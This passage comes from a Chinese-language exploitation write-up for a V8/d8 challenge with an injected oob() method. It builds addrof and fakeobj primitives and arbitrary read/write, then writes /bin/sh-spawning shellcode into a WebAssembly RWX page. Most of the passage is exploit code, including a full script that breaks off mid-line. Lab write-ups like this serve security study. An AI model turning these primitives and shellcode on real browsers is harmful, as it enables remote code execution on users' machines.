class="number">0</span>] = obj;<span class="comment">//设置对象数组</span></span><br><span class="line">    obj_array.oob(float_array_map);<span class="comment">//将原本是对象的map覆盖为浮点数数组的map,之后读取就会以浮点数组对象的形式读取</span></span><br><span class="line">    <span class="comment">//从对象数组中读出对象，但是此时整个对象数组已经被改成浮点数组，所以会以浮点数数组形式读取，得到该对象的地址</span></span><br><span class="line">    <span class="comment">//正常情况从对象数组中读取对象会返回一个对象，不是该对象的地址，但是转换成浮点数组就会读取到成员的地址，这就是类型混淆</span></span><br><span class="line">    <span class="keyword">let</span> addr = mem.f2i(obj_array[<span class="number">0</span>])</span><br><span class="line">    obj_array.oob(obj_map);<span class="comment">//重新设置回来</span></span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFakeObj</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = mem.i2f(addr);<span class="comment">//设置浮点数数组</span></span><br><span class="line">    float_array.oob(obj_array_map);<span class="comment">//设置map属性将浮点数数组转化为对象数组</span></span><br><span class="line">    <span class="keyword">let</span> fake_obj = float_array[<span class="number">0</span>];<span class="comment">//获取转化之后的对象数组，就能得到该fake_obj，其地址为addr，对象类型为字典对象</span></span><br><span class="line">    float_array.oob(float_map);<span class="comment">//重新设置回来</span></span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>实际测试一下</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj_addr = getAddress(obj);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*]obj_addr:&quot;</span>+hex(obj_addr));</span><br><span class="line">%DebugPrint(obj)</span><br><span class="line">%SystemBreak()</span><br></pre></td></tr></table></div></figure>

<p>可以看到成功获取地址</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221213865.png" alt="image-20220322121328820"></p>
<p>但是这么判断转化对象成功不太知道…</p>

        <h3 id="2-利用转化函数构造任意读写"   >
          <a href="#2-利用转化函数构造任意读写" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-利用转化函数构造任意读写" class="headerlink" title="(2)利用转化函数构造任意读写"></a>(2)利用转化函数构造任意读写</h3>
      <p>得到了上述的转化函数，那么我们可以借助这两个转化函数来获取任意地址读和任意地址写</p>

        <h4 id="原理："   >
          <a href="#原理：" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4>
      <p>利用<code>getFakeObj</code>将一个地址转化为一个浮点数组对象，而如果该地址指向的elements指针可控，那么我们就能够修改其elements指针，从而指向任意地方，去进行读写操作。</p>
<p>需要注意的是，由于依据elements读写的时候没有进行检测，所以只要成功修改了elements指针，那么我们我们就能从elements实际存放数据的地方，也就是*(elements+0x10)处读写我们的数据，造成任意地址读写。</p>
<p>假定申请<code>fake_array[6]</code>，如下图布局</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221519946.png" alt="未命名文件 (2)"></p>
<p>即如上图所示，设置<code>fake_array_addr-0x40+0x10</code>的地址为一个<code>fake_obj</code>，那么该<code>fake_obj</code>相关的属性如下</p>
<ul>
<li><p><code>map</code>即为<code>float_array_map</code>，可以由fake_array[0]进行控制，由此可以进行元素读写</p>
</li>
<li><p><code>protototype</code>即设置为0，可由<code>fake_array[1]</code>进行控制</p>
</li>
<li><p><code>elements</code>即设置为我们需要读写的地址，可由<code>fake_array[2]</code>进行控制</p>
</li>
</ul>
<p>那么即可完成整个读写布局。</p>

        <h4 id="代码："   >
          <a href="#代码：" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码：" class="headerlink" title="代码："></a>代码：</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    mem.i2f(<span class="number">0n</span>),</span><br><span class="line">    mem.i2f(<span class="number">0x41414141n</span>),</span><br><span class="line">    mem.i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">let</span> fake_array_addr = getAddress(fake_array);</span><br><span class="line"><span class="keyword">let</span> fake_object_addr = fake_array_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">let</span> fake_object = getFakeObj(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = mem.i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = mem.f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: &quot;</span> +hex(addr) + <span class="string">&quot;: &quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = mem.i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = mem.i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : &quot;</span> +hex(addr) + <span class="string">&quot;: &quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="测试效果："   >
          <a href="#测试效果：" class="heading-link"><i class="fas fa-link"></i></a><a href="#测试效果：" class="headerlink" title="测试效果："></a>测试效果：</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%DebugPrint(fake_array);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] fake_array_addr:&quot;</span> + hex(fake_array_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] fake_object_addr:&quot;</span> + hex(fake_object_addr));</span><br><span class="line">read64(fake_array_addr-<span class="number">0x40n</span>+<span class="number">0x28n</span>-<span class="number">1n</span>);</span><br><span class="line">write64(fake_object_addr+<span class="number">0x18n</span>-<span class="number">1n</span>,<span class="number">0x01020304n</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></div></figure>

<p>那么我们即读写fake_array[3]处的值，可以看到成功读写</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221529435.png" alt="image-20220322152925354"></p>

        <h2 id="3-实际利用"   >
          <a href="#3-实际利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-实际利用" class="headerlink" title="3.实际利用"></a>3.实际利用</h2>
      
        <h3 id="1-常规堆思路"   >
          <a href="#1-常规堆思路" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-常规堆思路" class="headerlink" title="(1)常规堆思路"></a>(1)常规堆思路</h3>
      <p>通过泄露d8的ELF地址，计算其GOT表地址，任意读泄露出libc地址，然后覆盖<code>free_hook</code>为<code>system</code>函数，之后通过<code>console.log(&#39;/bin/sh\x00&#39;)</code>即可释放一个包含<code>/bin/sh</code>的堆块完成利用</p>
<p>这个泄露地址部分有点不太好搞，随机泄露的部分没看，稳定泄露的部分不太对，获取到的不是d8中的指令地址，而是一个lib库的指令地址。</p>
<p>🔺后面补把</p>

        <h3 id="2-利用WASM机制"   >
          <a href="#2-利用WASM机制" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-利用WASM机制" class="headerlink" title="(2)利用WASM机制"></a>(2)利用WASM机制</h3>
      <p>如下可以将C语言直接转换为wasm并生成JS配套调用代码</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wasdk.github.io/WasmFiddle/" >WasmFiddle (wasdk.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>wasm就是一个用来调用C代码的机制，可以自己去看看，但是不能赋予危险的代码来调用，只能运行数学计算、图像处理等系统无关的高级语言代码。</p>
<p>简单来说，我们可以创建一片WASM的空间，然后如果我们可以修改到这片运行WASM代码的内存空间(利用上述的任意写)，修改其为shellcode，然后当d8调用WASM的接口时，就可以调用到我们的shellcode了。</p>
<p>而运行WASM代码的内存空间即为WASM_instance+0x88处</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">let</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br></pre></td></tr></table></div></figure>

<p>也就是上述的<code>wasmInstance</code>地址+0x88处</p>
<p>其中wasmCode的功能为</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="number">42</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="①泄露地址"   >
          <a href="#①泄露地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#①泄露地址" class="headerlink" title="①泄露地址"></a>①泄露地址</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_instance_addr = getAddress(wasmInstance);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] wasm_instance_addr: &quot;</span> + hex(wasm_instance_addr));</span><br><span class="line"><span class="keyword">let</span> rwx_page_addr = read64(wasm_instance_addr -<span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] rwx_page_addr: &quot;</span> + hex(rwx_page_addr));</span><br></pre></td></tr></table></div></figure>


        <h4 id="②写入shellcode到wasm的rwx段"   >
          <a href="#②写入shellcode到wasm的rwx段" class="heading-link"><i class="fas fa-link"></i></a><a href="#②写入shellcode到wasm的rwx段" class="headerlink" title="②写入shellcode到wasm的rwx段"></a>②写入shellcode到wasm的rwx段</h4>
      <p>这里有个问题，就是连续使用两次<code>write64</code>会出错，具体原因不清楚，说什么floatArray已经被篡改，再检测合法性会出错，被篡改成啥也不知道啊，这边有点问题，之后看能不能补上。</p>
<p>🔺</p>
<p>那么依据大佬的，需要进行修改，使用<code>dataview</code>来进行修改</p>
<p>原理即为</p>
<p>DataView对象中的<code>backing_store</code>会指向申请的<code>data_buf</code>（<code>backing_store</code>相当于我们的elements），修改<code>backing_store</code>为我们想要写的地址，并通过DataView对象的setBigUint64方法就可以往指定地址正常写入数据了。</p>
<p>🔺</p>
<p>不太懂</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeAny</span>(<span class="params">addr,data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">let</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(data.length * <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line">  <span class="keyword">let</span> buf_backing_store_addr = getAddress(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;[*] buf_backing_store_addr: &quot;</span>+hex(buf_backing_store_addr));</span><br><span class="line"></span><br><span class="line">  write64(buf_backing_store_addr-<span class="number">1n</span>,addr);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; data.length; ++i)</span><br><span class="line">    data_view.setFloat64(i * <span class="number">8</span>, mem.i2f(data[i]), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shellcode = [</span><br><span class="line">  <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">  <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">  <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line">writeAny(rwx_page_addr,shellcode);</span><br></pre></td></tr></table></div></figure>


        <h4 id="③调用wasm来执行shellcode"   >
          <a href="#③调用wasm来执行shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#③调用wasm来执行shellcode" class="headerlink" title="③调用wasm来执行shellcode"></a>③调用wasm来执行shellcode</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f();</span><br></pre></td></tr></table></div></figure>

<p>直接通过这个调用即可。</p>

        <h4 id="EXP"   >
          <a href="#EXP" class="heading-link"><i class="fas fa-link"></i></a><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span>+i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memory</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="built_in">this</span>.float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="built_in">this</span>.buf);</span><br><span class="line">        <span class="comment">// this.u32 = new Uint32Array(this.buf);</span></span><br><span class="line">        <span class="comment">// this.bytes = new Uint8Array(this.buf);</span></span><br><span class="line">        <span class="built_in">this</span>.bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(<span class="built_in">this</span>.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">f2i</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.float64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.bigUint64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">i2f</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.bigUint64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.float64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> mem = <span class="keyword">new</span> Memory()</span><br><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];<span class="comment">//创建一个浮点数数组</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;<span class="comment">//创建一个对象</span></span><br><span class="line"><span class="keyword">let</span> obj_array = [obj];<span class="comment">//创建一个对象数组</span></span><br><span class="line"><span class="keyword">let</span> float_array_map = float_array.oob()</span><br><span class="line"><span class="keyword">let</span> obj_array_map = obj_array.oob()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAddress</span>(<span class="params">obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj;<span class="comment">//设置对象数组</span></span><br><span class="line">    obj_array.oob(float_array_map);<span class="comment">//将原本是对象的map覆盖为浮点数数组的map,之后读取就会以浮点数组对象的形式读取</span></span><br><span class="line">    <span class="comment">//从对象数组中读出对象，但是此时整个对象数组已经被改成浮点数组，所以会以浮点数数组形式读取，得到该对象的地址</span></span><br><span class="line">    <span class="comment">//正常情况从对象数组中读取对象会返回一个对象，不是该对象的地址，但是转换成浮点数组就会读取到成员的地址，这就是类型混淆</span></span><br><span class="line">    <span class="keyword">let</span> obj_addr = mem.f2i(obj_array[<span class="number">0</span>])</span><br><span class="line">    obj_array.oob(obj_array_map);<span class="comment">//重新设置回来</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFakeObj</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = mem.i2f(addr);<span class="comment">//设置浮点数数组</span></span><br><span class="line">    float_array.oob(obj_array_map);<span class="comment">//将浮点数数组转化为对象数组</span></span><br><span class="line">    <span class="keyword">let</span> fake_obj = float_array[<span class="number">0</span>];<span class="comment">//获取转化之后的对象数组，就能得到该fake_obj，其地址为addr，对象类型为字典对象</span></span><br><span class="line">    float_array.oob(float_array_map);<span class="comment">//重新设置回来</span></span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    mem.i2f(<span class="number">0n</span>),</span><br><span class="line">    mem.i2f(<span class="number">0x41414141n</span>),</span><br><span class="line">    mem.i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">let</span> fake_array_addr = getAddress(fake_array);</span><br><span class="line"><span class="keyword">let</span> fake_object_addr = fake_array_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">let</span> fake_object = getFakeObj(fake_object_addr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] fake_array_addr:&quot;</span> + hex(fake_array_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] fake_object_addr:&quot;</span> + hex(fake_object_addr));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = mem.i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = mem.f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: &quot;</span> +hex(addr) + <span class="string">&quot;: &quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = mem.i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = mem.i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : &quot;</span> +hex(addr) + <span class="string">&quot;: &quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeAny</span>(<span class="params">addr,data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">let</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(data.length * <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line">  <span class="keyword">let</span> buf_backing_store_addr = getAddress(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;[*] buf_backing_store_addr: &quot;</span>+hex(buf_backing_store_addr));</span><br><span class="line"></span><br><span class="line">  write64(buf_backing_store_addr-<span class="number">1n</span>,addr);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; data.length; ++i)</span><br><span class="line">    data_view.setFloat64(i * <span class="number">8</span>, mem.i2f(data[i]), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">let</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">let</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="keyword">let</span> wasm_instance_addr = 